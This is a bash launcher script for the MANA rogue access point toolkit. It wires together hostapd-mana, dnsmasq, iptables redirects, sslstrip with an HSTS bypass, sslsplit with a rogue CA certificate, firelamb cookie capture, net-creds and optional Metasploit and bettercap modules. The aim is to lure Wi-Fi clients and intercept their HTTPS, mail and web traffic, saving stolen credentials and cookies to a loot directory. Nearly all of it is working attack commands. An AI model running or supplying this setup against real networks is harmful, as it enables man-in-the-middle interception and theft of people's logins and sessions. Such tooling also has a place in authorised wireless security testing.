#!/bin/bash
source $(cd $(dirname $0); pwd -P)/_custom_functions.sh

upstream=eth0
phy=wlan1

etc=/etc/mana-toolkit
lib=/usr/lib/mana-toolkit
share=/usr/share/mana-toolkit
loot=/var/lib/mana-toolkit

#conf=$(cd $(dirname $0); pwd -P)/_custom_start-nat-full.conf #Default:[/etc/mana-toolkit/hostapd-mana.conf]
conf=$etc/hostapd-mana.conf
hostapd=$lib/hostapd

check_ap_mode(){
 if ! iw list | grep 'AP$'>/dev/null
  then
   echo '[*] Cannot find interface supporting: "AP-mode"!'
   echo "[?] Continue anyway?(y/n)"
    read ans
     case "$ans" in
      n|N|no|No|NO) echo "Exiting..."; exit ;;
      y|Y|yes|Yes|YES) echo "Continuing..." ;;
     esac
 fi
}

start_hostname(){
	hostname WRT54G
	echo "[*] Changed hostname to: WRT54G"
	sleep 2
}

clearwifi(){
	service network-manager stop
	rfkill unblock wlan
}

start_macchanger(){
        ifconfig "$phy" down
        macchanger -r "$phy"
        ifconfig "$phy" up
}

start_hostapd(){
	sed -i "s/^interface=.*$/interface=$phy/" $conf
	$hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
}

start_dnsmasq(){
	dnsmasq --bind-interfaces --conf-file=$etc/dnsmasq-dhcpd.conf --interface=$phy --except-interface=lo #--port=0
}

start_nat_firewall(){
        echo '1' > /proc/sys/net/ipv4/ip_forward
        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -F
        iptables -t nat -F
        iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
        iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
        iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
#        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
}

start_sslstrip(){
        cd $share/sslstrip-hsts/sslstrip2/
        python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.`date "+%s"`&
        iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        cd $share/sslstrip-hsts/dns2proxy/
        python dns2proxy.py -i $phy&
        cd -
}

start_sslsplit(){
        sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
         https 0.0.0.0 10443 \
         http 0.0.0.0 10080 \
         ssl 0.0.0.0 10993 \
         tcp 0.0.0.0 10143 \
         ssl 0.0.0.0 10995 \
         tcp 0.0.0.0 10110 \
         ssl 0.0.0.0 10465 \
         tcp 0.0.0.0 10025&
#        iptables -t nat -A INPUT -i $phy \
#         -p tcp --destination-port 80 \
#         -j REDIRECT --to-port 10080
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 443 \
         -j REDIRECT --to-port 10443
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 143 \
         -j REDIRECT --to-port 10143
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 993 \
         -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 65493 \
         -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 465 \
         -j REDIRECT --to-port 10465
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 25 \
         -j REDIRECT --to-port 10025
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 995 \
         -j REDIRECT --to-port 10995
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 110 \
         -j REDIRECT --to-port 10110
}

start_firelamb(){
        $share/firelamb/firelamb.py -i $phy &
}

start_netcreds(){
        python $share/net-creds/net-creds.py -i $phy > $loot/net-creds.log.`date "+%s"`
}

start_msfconsole(){
        sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
        msfconsole -r $etc/karmetasploit.rc& #Remove "&" to fix msfconsole exiting
}

start_bettercap(){
 bettercap -T 10.0.0.20 --interface $phy --no-spoofing --no-discovery --proxy --proxy-port 80 --proxy-https-port 443 -P POST
}

hangon(){
        echo -e "\n"
        echo -e "[*] The captured traffic will be in /var/lib/mana-toolkit \n"
        echo -e "[*] and $etc/run-mana/credentials.txt \n"
        echo -e "[>] Hit enter to kill me"
         read
}

killem(){
        echo "[*] Killing...."
        service apache2 stop

        pkill -f dhcpd
        pkill -f start_dnsmasq
        pkill -f dnsspoof
        pkill -f dnsmasq
        pkill -f dns2proxy
        pkill -f firelamb
        pkill -f start_firelamb
        pkill -f hostapd
        pkill -f start_hostapd
        pkill -f start_msfconsole
        pkill -f msfconsole
        pkill -f start_msfconsole
        pkill -f start_nat_firewall
        pkill -f net-creds
#        pkill -f python
#        pkill -f ruby
        pkill -f start_netcreds
        pkill -f sslsplit
        pkill -f sslstrip
        pkill -f start_sslstrip
        pkill -f stunnel4
        pkill -f tinyproxy

        rm --verbose --force $EXNODE
        rm --verbose --force /tmp/crackapd.run

        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -t nat -F
exit
}


start-nat-full(){
echo "Checking if AP-mode supported interface is present"
 ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
echo "Changing hostname"
 ./$0 --start_hostname   #Change systems hostname
echo "Stopping newtork-manager & unblocking wifi"
 ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
echo "Changing MAC"
 ./$0 --start_macchanger #Change mac
  sleep 4
echo "Starting hostapd"
 ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
  sleep 5
echo "Starting dnsmasq"
 ./$0 --start_dnsmasq &&    #Dnsmasq - 
  sleep 5
echo "Starting sslstrip"
 ./$0 --start_sslstrip &&   #SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
  sleep 2
echo "Starting sslsplit"
 ./$0 --start_sslsplit &   #Sslsplit - 
  sleep 5
echo "Starting nat-firewall"
 ./$0 --start_nat_firewall && #Nat firewall - 
  sleep 2
echo "Starting firelamb"
 ./$0 --start_firelamb & #Firelamb - Captures and writes cookies to a firefox profile for easy use.
  sleep 5
echo "Starting netcreds"
 ./$0 --start_netcreds &  #Netcreds - 
#echo "Starting msfconsole"
# $TERM_ -hold -T "start_msfconsole"      $TOPLEFTBIG -e "bash -c '$0 --start_msfconsole'"  & sleep 2 && #Metasploit -
#  sleep 2
#echo "Starting crackapd"
# ./$0 --start_crackapd & #Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
#  sleep 2
#echo "Starting apache"
# ./$0 --start_apache &   #Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley

	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit
}

start-nat-simple(){
	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit

}

start-noupstream(){
	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit
}

start-noupstream-eap(){
	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit
}

# ============================================================ #
# ================== < Startup & Shutdown > ================== #
# ============================================================ #
usage(){
echo "$FUNCNAME"
    echo $"""
 Usage: $(basename "$0") [-f] [--start-nat-full]      - Will fire up MANA in NAT mode (you'll need an upstream link) with all the MitM bells and whistles.
 Usage: $(basename "$0") [-s] [--start-nat-simple     - Will fire up MANA in NAT mode, but without any of the firelamb, sslstrip, sslsplit etc.
 Usage: $(basename "$0") [-n] [--start-noupstream     - Will start MANA in a "fake Internet" mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.
 Usage: $(basename "$0") [-e] [--start-noupstream-eap - Will start MANA with the EAP attack and noupstream mode.

 Usage: $(basename "$0") [-e] [--edit]   | Edit this file.
 Usage: $(basename "$0") [-h] [--help]   | Print this help.
"
}

# ============= < Argument Loaded Configurables > ============ #
if [ $# = 0 ]; then
  usage
 exit 1
fi

ACNT=1
for ARG in $@
 do
  ACNT=$((ACNT + 1))
  case $ARG in
   #Sub launchers
      --check_ap_mode)  	   check_ap_mode        ;;
      --start_hostname)  	   start_hostname       ;;
      --clearwifi)  	           clearwifi            ;;
      --start_macchanger)          start_macchanger     ;;
      --start_hostapd)  	   start_hostapd        ;;
      --start_dnsmasq)  	   start_dnsmasq        ;;
      --start_nat_firewall)  	   start_nat_firewall   ;;
      --start_sslstrip)  	   start_sslstrip       ;;
      --start_sslsplit)  	   start_sslsplit       ;;
      --start_firelamb)  	   start_firelamb       ;;
      --start_netcreds)  	   start_netcreds       ;;
      --start_msfconsole)	   start_msfconsole     ;;
      --hangon)  		   hangon               ;;
      --killem)  		   killem               ;;
   #Main launchers
      -f|--start-nat-full)         start-nat-full       ;;
      -s|--start-nat-simple)       start-nat-simple     ;;
      -n|--start-noupstream)       start-noupstream     ;;
      -e|--start-noupstream-eap)   start-noupstream-eap ;;
   #Other
      -e|--edit)                   nano "$0" ; exit     ;;
      -h|--help)                   usage    ; break    ;;
      --)                          shift     ; break    ;;
       *) echo "[x] Bad Option: $1" && usage; exit 1   ;;
  esac
done

exit
